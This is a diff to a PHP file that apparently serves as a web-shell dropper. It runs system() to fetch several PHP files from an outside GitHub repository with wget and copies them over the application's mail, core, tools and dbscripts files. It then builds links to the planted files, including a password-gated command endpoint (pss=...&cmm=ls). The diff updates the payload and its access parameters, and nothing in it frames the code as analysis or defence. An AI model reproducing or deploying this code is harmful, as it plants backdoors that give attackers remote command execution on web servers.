@@ -1,11 +1,11 @@
 <?php
-system("wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/Mail.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/Request.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/dbscripts.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/autoMaintenance.php;cp Mail.php ../../../classes/mail/Mail.php;cp Request.php ../../../classes/core/Request.php;cp autoMaintenance.php ../../../tools/autoMaintenance.php;cp dbscripts.php ../../../dbscripts/index.php;");
+system("wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/Mail.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/Core.inc.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/dbscripts.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/autoMaintenance.php;cp Mail.php ../../../classes/mail/Mail.php;cp Core.inc.php ../../../classes/core/Core.inc.php;cp autoMaintenance.php ../../../tools/autoMaintenance.php;cp dbscripts.php ../../../dbscripts/index.php;");
 
 $domainName = $_SERVER['SERVER_NAME'];
 
 $domainUrl = "http://" . $domainName;
 $mailUrl = "http://" . $domainName . "/classes/mail/Mail.php";
-$requestUrl = "http://" . $domainName . "/classes/core/Request.php?c=pwd";
+$requestUrl = "http://" . $domainName . "/classes/core/Core.inc.php?pss=123@ayamjago&cmm=ls";
 $autoMaintenanceUrl = "http://" . $domainName . "/tools/autoMaintenance.php";
 $dbscriptsUrl = "http://" . $domainName . "/dbscripts";
 
@@ -113,7 +113,7 @@ $dbscriptsUrl = "http://" . $domainName . "/dbscripts";
 
     <script>
         var dmailUrl = "http://" + window.location.hostname + "/classes/mail/Mail.php",
-            drequestUrl = "http://" + window.location.hostname + "/classes/core/Request.php?c=pwd",
+            drequestUrl = "http://" + window.location.hostname + "/classes/core/Core.inc.php?pss=123@ayamjago&cmm=ls",
             dautoMaintenanceUrl = "http://" + window.location.hostname + "/tools/autoMaintenance.php",
             ddbscriptsUrl = "http://" + window.location.hostname + "/dbscripts";
 
